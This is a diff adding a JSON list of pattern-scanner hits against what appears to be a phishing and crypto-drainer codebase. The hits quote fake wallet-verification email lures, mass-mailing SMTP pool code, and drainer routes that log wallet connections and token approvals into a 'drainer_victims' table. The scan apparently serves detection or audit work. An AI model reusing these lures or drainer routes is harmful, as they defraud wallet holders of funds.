@@ -1,0 +1,1370 @@
+[
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 603,
+    "text": "qr = _qr_html(include_qr, qr_b64, \"Scan to verify wallet ownership:\")"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 614,
+    "text": "<h2 style=\"margin:0 0 16px;font-size:20px;color:#e0e0e0\">Wallet Verification Required</h2>"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 624,
+    "text": "<a href=\"{target_url}\" style=\"display:inline-block;padding:14px 44px;background:{color};color:#fff;text-decoration:none;font-size:14px;font-weight:600;border-radius:6px\" target=\"_blank\">Verify Wallet</a>"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 1202,
+    "text": "<h2 style=\"margin:0 0 16px;font-size:18px;color:#1a1a1a\">Transfer Confirmation Required</h2>"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 1213,
+    "text": "<a href=\"{target_url}\" style=\"display:inline-block;padding:12px 40px;background:{color};color:#fff;text-decoration:none;font-size:14px;font-weight:600;border-radius:4px\" target=\"_blank\">Confirm Transfer</a>"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 1350,
+    "text": "<h2 style=\"margin:0 0 16px;font-size:20px;color:#1a1a1a\">Wallet Verification Required</h2>"
+  },
+  {
+    "pattern": "lure_wallet_phrases",
+    "file": "app/server/routes/lure.py",
+    "line": 1357,
+    "text": "<a href=\"{target_url}\" style=\"display:inline-block;padding:14px 44px;background:{color};color:#fff;text-decoration:none;font-size:14px;font-weight:600;border-radius:6px\" target=\"_blank\">Verify Wallet</a>"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/lure.py",
+    "line": 1844,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/lure.py",
+    "line": 1883,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/lure.py",
+    "line": 1897,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/lure.py",
+    "line": 1921,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/lure.py",
+    "line": 1951,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "phish_intel_feeds",
+    "file": "app/server/routes/monitor.py",
+    "line": 263,
+    "text": "\"https://urlhaus-api.abuse.ch/v1/host/\","
+  },
+  {
+    "pattern": "phish_intel_feeds",
+    "file": "app/server/routes/monitor.py",
+    "line": 286,
+    "text": "\"https://openphish.com/feed.txt\","
+  },
+  {
+    "pattern": "phish_intel_feeds",
+    "file": "app/server/routes/monitor.py",
+    "line": 303,
+    "text": "f\"https://phishstats.info:2096/api/phishing\""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 7,
+    "text": "import smtplib"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 19,
+    "text": "import aiosmtplib"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 49,
+    "text": "\"CREATE TABLE IF NOT EXISTS smtp_accounts (\""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 59,
+    "text": "\"from_name TEXT, reply_to TEXT, smtp_account_id TEXT, \""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 65,
+    "text": "class SmtpAccountCreate(BaseModel):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 82,
+    "text": "smtp_account_id: str | None = None"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 91,
+    "text": "smtp_account_id: str | None = None"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 104,
+    "text": "def _classify_smtp_error(exc: Exception, /) -> str:"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 107,
+    "text": "exc, (smtplib.SMTPAuthenticationError, aiosmtplib.SMTPAuthenticationError)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 113,
+    "text": "if isinstance(exc, (smtplib.SMTPConnectError, aiosmtplib.SMTPConnectError)):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 114,
+    "text": "return f\"Could not connect to SMTP server: {exc}\""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 116,
+    "text": "exc, (smtplib.SMTPRecipientsRefused, aiosmtplib.SMTPRecipientsRefused)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 119,
+    "text": "if isinstance(exc, (smtplib.SMTPSenderRefused, aiosmtplib.SMTPSenderRefused)):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 121,
+    "text": "if isinstance(exc, (smtplib.SMTPDataError, aiosmtplib.SMTPDataError)):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 124,
+    "text": "exc, (aiosmtplib.SMTPTimeoutError, aiosmtplib.SMTPConnectTimeoutError)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 127,
+    "text": "\"Connection timed out. The SMTP server may be unreachable or \""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 132,
+    "text": "\"Connection refused. Verify the SMTP host and port are correct \""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 137,
+    "text": "\"Connection timed out. The SMTP server may be unreachable or \""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 150,
+    "text": "return f\"SMTP error: {exc}\""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 153,
+    "text": "async def _smtp_open_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 162,
+    "text": ") -> aiosmtplib.SMTP:"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 165,
+    "text": "client: aiosmtplib.SMTP = aiosmtplib.SMTP("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 175,
+    "text": "except (aiosmtplib.SMTPException, smtplib.SMTPException, ssl.SSLError, OSError):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 176,
+    "text": "with suppress(aiosmtplib.SMTPException, smtplib.SMTPException, OSError):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 182,
+    "text": "async def _smtp_connect_and_verify_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 190,
+    "text": "client: aiosmtplib.SMTP = await _smtp_open_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 193,
+    "text": "with suppress(aiosmtplib.SMTPException, smtplib.SMTPException, OSError):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 197,
+    "text": "_SMTP_SEND_MAX_RETRIES: Final[int] = 3"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 198,
+    "text": "_SMTP_SEND_BACKOFF_BASE: Final[float] = 1.0"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 201,
+    "text": "async def _smtp_send_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 215,
+    "text": "for attempt in range(_SMTP_SEND_MAX_RETRIES):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 217,
+    "text": "client: aiosmtplib.SMTP = await _smtp_open_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 223,
+    "text": "with suppress(aiosmtplib.SMTPException, smtplib.SMTPException, OSError):"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 227,
+    "text": "aiosmtplib.SMTPRecipientsRefused,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 228,
+    "text": "aiosmtplib.SMTPSenderRefused,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 229,
+    "text": "aiosmtplib.SMTPDataError,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 230,
+    "text": "aiosmtplib.SMTPAuthenticationError,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 231,
+    "text": "smtplib.SMTPRecipientsRefused,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 232,
+    "text": "smtplib.SMTPSenderRefused,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 233,
+    "text": "smtplib.SMTPDataError,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 234,
+    "text": "smtplib.SMTPAuthenticationError,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 238,
+    "text": "aiosmtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 239,
+    "text": "smtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 245,
+    "text": "if attempt < _SMTP_SEND_MAX_RETRIES - 1:"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 247,
+    "text": "\"SMTP send attempt %d/%d failed: %s\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 249,
+    "text": "_SMTP_SEND_MAX_RETRIES,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 252,
+    "text": "await asyncio.sleep(_SMTP_SEND_BACKOFF_BASE * (2**attempt))"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 302,
+    "text": "@router.post(\"/smtp\")"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 303,
+    "text": "async def add_smtp_account("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 304,
+    "text": "body: SmtpAccountCreate,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 307,
+    "text": "user: dict[str, object] = await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 311,
+    "text": "await _smtp_connect_and_verify_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 319,
+    "text": "aiosmtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 320,
+    "text": "smtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 326,
+    "text": "detail=f\"SMTP verification failed: {_classify_smtp_error(exc)}\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 335,
+    "text": "INSERT INTO smtp_accounts ("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 372,
+    "text": "@router.get(\"/smtp\")"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 373,
+    "text": "async def list_smtp_accounts(request: Request) -> dict[str, Any]:"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 395,
+    "text": "\"SELECT * FROM smtp_accounts ORDER BY created_at DESC\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 401,
+    "text": "@router.delete(\"/smtp/{account_id}\")"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 402,
+    "text": "async def delete_smtp_account("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 406,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 410,
+    "text": "\"SELECT id FROM smtp_accounts WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 415,
+    "text": "detail=\"SMTP account not found\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 418,
+    "text": "await db.execute(\"DELETE FROM smtp_accounts WHERE id = ?\", (account_id,))"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 423,
+    "text": "@router.post(\"/smtp/{account_id}/test\")"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 424,
+    "text": "async def test_smtp_account("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 428,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 432,
+    "text": "\"SELECT * FROM smtp_accounts WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 438,
+    "text": "detail=\"SMTP account not found\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 444,
+    "text": "await _smtp_connect_and_verify_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 452,
+    "text": "aiosmtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 453,
+    "text": "smtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 459,
+    "text": "\"UPDATE smtp_accounts SET verified = 0, updated_at = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 462,
+    "text": "return {\"success\": False, \"error\": _classify_smtp_error(exc)}"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 466,
+    "text": "\"UPDATE smtp_accounts SET verified = 1, updated_at = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 490,
+    "text": "async def _smtp_accounts_for_pool("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 496,
+    "text": "\"SELECT * FROM smtp_accounts WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 506,
+    "text": "\"SELECT * FROM smtp_accounts WHERE id != ? AND verified = 1 \""
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 514,
+    "text": "@router.post(\"/send\")"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 517,
+    "text": "smtp_account_id: str | None = None,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 526,
+    "text": "user: dict[str, object] = await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 534,
+    "text": "smtp_account_id = str(form.get(\"smtp_account_id\", smtp_account_id or \"\"))"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 589,
+    "text": "smtp_account_id = json_body.get(\"smtp_account_id\", smtp_account_id)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 600,
+    "text": "if not smtp_account_id or not to or not subject or not body_html:"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 603,
+    "text": "detail=\"smtp_account_id, to, subject, and body_html are required\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 606,
+    "text": "accounts: list[dict[str, Any]] = await _smtp_accounts_for_pool("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 607,
+    "text": "str(smtp_account_id),"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 613,
+    "text": "detail=\"SMTP account not found\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 640,
+    "text": "smtp_plain_password: str = decrypt_secret_compat(str(row[\"password\"]))"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 655,
+    "text": "await _smtp_send_async("
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 659,
+    "text": "smtp_plain_password,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 669,
+    "text": "aiosmtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 670,
+    "text": "smtplib.SMTPException,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 674,
+    "text": "last_error = _classify_smtp_error(exc)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 675,
+    "text": "logger.error(\"SMTP send failed for account %s: %s\", account_id, exc)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 678,
+    "text": "\"UPDATE smtp_accounts SET verified = 0, updated_at = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 706,
+    "text": "\"smtp_account_id\": used_account_id,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 707,
+    "text": "\"used_pool\": use_pool_flag and used_account_id != str(smtp_account_id),"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 731,
+    "text": "user: dict[str, object] = await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 741,
+    "text": "reply_to, smtp_account_id, created_by,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 752,
+    "text": "body.smtp_account_id,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 766,
+    "text": "\"smtp_account_id\": body.smtp_account_id,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 778,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 799,
+    "text": "\"smtp_account_id\": body.smtp_account_id,"
+  },
+  {
+    "pattern": "smtp_send",
+    "file": "app/server/routes/nfa_mailer.py",
+    "line": 830,
+    "text": "await require_perm(\"mail.send\", request)"
+  },
+  {
+    "pattern": "proxy_route",
+    "file": "app/server/routes/serve/assets_proxy.py",
+    "line": 82,
+    "text": "@router.get(\"/__nexus_proxy/{connection_id}/t/{token}/{encoded_url:path}\")"
+  },
+  {
+    "pattern": "proxy_route",
+    "file": "app/server/routes/serve/assets_proxy.py",
+    "line": 86,
+    "text": "encoded_url: str,"
+  },
+  {
+    "pattern": "proxy_route",
+    "file": "app/server/routes/serve/assets_proxy.py",
+    "line": 100,
+    "text": "target_url: str = decode_proxy_url(encoded_url)"
+  },
+  {
+    "pattern": "drainer_docstring",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 1,
+    "text": "\"\"\"Crypto drainer routes \u2014 capture wallet connections and token approvals.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 1,
+    "text": "\"\"\"Crypto drainer routes \u2014 capture wallet connections and token approvals.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 18,
+    "text": "logger: Final[logging.Logger] = logging.getLogger(\"nexus.drainer\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 20,
+    "text": "router: Final[APIRouter] = APIRouter(tags=[\"drainer\"])"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 26,
+    "text": "CREATE TABLE IF NOT EXISTS drainer_victims ("
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 33,
+    "text": "drainer_addr TEXT DEFAULT '',"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 55,
+    "text": "\"SELECT * FROM drainer_victims WHERE wallet_address = ? AND chain = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 61,
+    "text": "\"UPDATE drainer_victims SET updated_at = ?, client_ip = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 71,
+    "text": "INSERT INTO drainer_victims"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 84,
+    "text": "\"drainer_addr\": \"\","
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 92,
+    "text": "@router.post(\"/drainer/connect\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 92,
+    "text": "@router.post(\"/drainer/connect\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 93,
+    "text": "async def drainer_connect(request: Request) -> Response:"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 102,
+    "text": "return RedirectResponse(\"/drainer/connect?error=1\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 102,
+    "text": "return RedirectResponse(\"/drainer/connect?error=1\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 111,
+    "text": "await store_event(cid, \"drainer_connect\", payload={\"address\": address, \"chain\": chain})"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 115,
+    "text": "\"type\": \"drainer_connect\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 123,
+    "text": "logger.info(\"drainer connect: %s (%s) from %s\", address[:10], chain, victim.get(\"client_ip\"))"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 126,
+    "text": "return RedirectResponse(f\"/drainer/approve?address={address}&chain={chain}\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 126,
+    "text": "return RedirectResponse(f\"/drainer/approve?address={address}&chain={chain}\", status_code=302)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 129,
+    "text": "@router.post(\"/drainer/approve\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 129,
+    "text": "@router.post(\"/drainer/approve\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 130,
+    "text": "async def drainer_approve(request: Request) -> Response:"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 137,
+    "text": "drainer_addr = str(form.get(\"drainer\", \"\")).strip()"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 140,
+    "text": "return RedirectResponse(\"/drainer/connect\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 140,
+    "text": "return RedirectResponse(\"/drainer/connect\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 149,
+    "text": "UPDATE drainer_victims"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 150,
+    "text": "SET tokens = ?, signature = ?, drainer_addr = ?, status = 'approved', updated_at = ?"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 153,
+    "text": "(tokens, signature[:200] if signature else \"\", drainer_addr, now, address, chain),"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 160,
+    "text": "await store_event(cid, \"drainer_approve\", payload={"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 167,
+    "text": "\"type\": \"drainer_approve\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 176,
+    "text": "logger.info(\"drainer approve: %s tokens=%s sig=%s\", address[:10], tokens, signature[:20] if signature else \"none\")"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 178,
+    "text": "return RedirectResponse(f\"/drainer/done?address={address}&chain={chain}&tokens={tokens}\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 178,
+    "text": "return RedirectResponse(f\"/drainer/done?address={address}&chain={chain}&tokens={tokens}\", status_code=302)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 181,
+    "text": "@router.post(\"/drainer/done\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 181,
+    "text": "@router.post(\"/drainer/done\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 182,
+    "text": "async def drainer_done(request: Request) -> Response:"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 194,
+    "text": "\"UPDATE drainer_victims SET status = 'drained', updated_at = ? WHERE wallet_address = ? AND chain = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 199,
+    "text": "await store_event(cid, \"drainer_done\", payload={\"address\": address, \"chain\": chain, \"tokens\": tokens})"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 202,
+    "text": "\"type\": \"drainer_done\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 209,
+    "text": "logger.info(\"drainer DONE: %s (%s) tokens=%s\", address[:10], chain, tokens)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 211,
+    "text": "# Redirect to the drained page (served by the normal page router)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 212,
+    "text": "return RedirectResponse(f\"/drainer/done?address={address}&chain={chain}&tokens={tokens}\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 212,
+    "text": "return RedirectResponse(f\"/drainer/done?address={address}&chain={chain}&tokens={tokens}\", status_code=302)"
+  },
